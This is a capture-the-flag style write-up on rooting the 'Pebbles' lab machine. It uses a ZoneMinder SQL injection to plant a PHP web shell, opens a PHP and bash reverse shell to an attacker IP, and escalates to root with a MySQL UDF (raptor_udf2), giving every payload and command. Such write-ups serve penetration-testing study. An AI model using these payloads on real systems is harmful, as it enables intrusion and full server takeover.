#box #zoneminder #RCE #SQLi #MySQL-UDF #MySQL-v4x_5

Pebbles is an easy machine, according to OSCP, which revolves all around a SQLi that will permit us to gain first the foothold and then a privilege escalation to the root of the machine. In both the cases we'll leverage existing CVEs which involve SQLi leverages.
First vulnerability involves a SQLi on Zoneminder, secondly, we can leverage a MySQL vulnerability to successfully create a UDF (User Defined Function) to create a file as root and get a privileged shell on the target.
The machine is initially granted with default authentication credentials as `sally:DrunkTidbitSilicon307`

## Nmap

The Nmap scan provides us the following insights:

```bash
# Nmap 7.95 scan initiated Thu Jul  3 14:15:57 2025 as: /usr/lib/nmap/nmap -sCV --min-rate=10000 -o nmap_sCV 192.168.209.52
Nmap scan report for 192.168.209.52
Host is up (0.031s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 aa:cf:5a:93:47:18:0e:7f:3d:6d:a5:af:f8:6a:a5:1e (RSA)
|   256 c7:63:6c:8a:b5:a7:6f:05:bf:d0:e3:90:b5:b8:96:58 (ECDSA)
|_  256 93:b2:6a:11:63:86:1b:5e:f5:89:58:52:89:7f:f3:42 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Pebbles
8080/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-favicon: Apache Tomcat
|_http-title: Tomcat
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul  3 14:16:09 2025 -- 1 IP address (1 host up) scanned in 12.06 seconds
```

The most relevant result involves the port 80, showing a login form.

## 80 - HTTP

Port 80, if enumerated, highlights the presence of a `/zm` endpoint, if reached, an application called Zoneminder, version 1.29.0 shows up. Zoneminder is an application used for monitoring cameras and televisions internally.
The version, if looked online for vulnerabilities pops up the following [exploit](https://www.exploit-db.com/exploits/41239).

## SQLi to gain a second foothold

We use Burpsuite to intercept the zoneminder index.php and opt for copying the SQLi mentioned in the exploit above, precisely we catch the `/zm/index.php` endpoint and we then convert the GET request into a POST passing the following payload 
`view=request&request=log&task=query&limit=100;(SELECT * FROM (SELECT(SLEEP(5)))OQkj)` expecting a time-based SQLi.

After confirming the SQLi is in place due to the timing of the response.
we opt for trying to craft a relevant SQLi that can grant us a foothold over than the initial one.
We first craft a payload that will give us the access to a webshell with:
`view=request&request=log&task=query&limit=100;SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/auth/shell.php"` and we then end up crafting the following payload 

```url title:"Command Injection payload to get a reverse shell"
http://192.168.149.52/shell.php?cmd=php -r '$sock=fsockopen("192.168.45.187",21);shell_exec("/bin/bash <&3 >&3 2>&3");'`
```

 that successfully grants us a shell responding to `nc -lvnp 21` and grants us a foothold as www-data.
## Reconnaissance and lead to Privilege Escalation

Throughout our reconnaissance we discover in `/etc/zm/zm.conf` the credentials of the root user (this file was denied the access to the first user gave to us at the beginning of the pentest, so the second foothold was crucial to be able to retrieve those credentials), discovering that the we're able to authenticate to mysql with the credentials `root:ShinyLucentMarker361`.
We then `mysql -u root -p` with `-p` to ask for password authentication and we then authenticate in the database. Inside of it we do not discover anything crucial, but we realize it's vulnerable to the following MySQL exploit that permits us to create custom UDF (User Defined Functions) that will permit us to gain a privilege escalation on that machine.
To do that, we rely on the existence of the following [exploit](https://www.exploit-db.com/exploits/1518). Since `gcc` is missing on the target machine we build the C script on our machine and then transfer it on the target with scp.

```bash title:"Building the C script"
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

```bash title:"Transferring the script on the target machine"
scp raptor_udf2.so sally@192.168.149.52:/tmp
```

Once moved the script on the target machine, we'll leverage MySQL UDF creation to create a custom function relying on the dynamic library just build:
```mysql title:"Creates a UDF using our malevolously crafted C library"
use mysql; # Selects the database to use
create table foo(line blob); #  Creates a table 'foo' with a column 'name' accepting values of type 'blob'
insert into foo values(load_file('/tmp/raptor_udf2.so')); # Inserts in 'foo' the content of our C library - The path must refer to where we place the library, in our case in `/tmp/`
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so'; # Dumps the content of foo into the plugin folders of MySQL - In this exercise, this path must be changed from '/usr/lib' to '/usr/lib/mysql/plugin/'
create function do_system returns integer soname 'raptor_udf2.so'; # Creates a custom function called `do_system` that leverages our malevolous dynamic library
select * from mysql.func; # Checks that the function has been created successfully
```

## Gaining Privilege Escalation

To gain Privilege Escalation, we now have to use the custom function to effectively obtain a shell. To do so, we must create a file (we couldn't make it work with a oneliner) that is executed and redirects the shell to our listener. To do so, we have two ways:
* Create a file, move it on the target machine, execute it with `do_system` our custom UDF
* Generate a file within `do_system` and then execute that file within another call of the `do_system` UDF

### Create a file and move it on the target

To make that work, we must create a bash file containing a simple reverse shell:

```bash title:"Simple Bash Reverse Shell"
#!/bin/bash

bash -i >& /dev/tcp/192.168.45.187/80 0>&1 
```

We move it on the target with `scp bash.sh sally@192.168.149.52:/tmp` and we do use `do_system` to execute it as root (we used port 80 because the others weren't working).
```bash title:"Executing the bash script within do_system"
select do_system('/bin/bash /tmp/bash.sh');
```
Obtaining a shell as root.

### Crafting a file directly within do_system and execute it

To avoid the file transfer, we can manage to create a multiline file specifying the shebang and the bash script, directly within the do_system UDF within shell redirects. I couldn't manage to make the script work all at once because the string wasn't wellformed and I couldn't use EOF to effectively end the writing of the file, but two recalls of the function managed to grant me a shell

```bash title:"Writing a bash shell in /tmp/reverse.sh"
select do_system('cat << EOF > /tmp/reverse.sh \n #!/bin/bash \n bash -i>& /dev/tcp/192.168.45.187/80 0>&1');
```

```bash title:"Executing the bash file"
select do_system('/bin/bash /tmp/reverse.sh');
```

Obtaining a root on the target machine.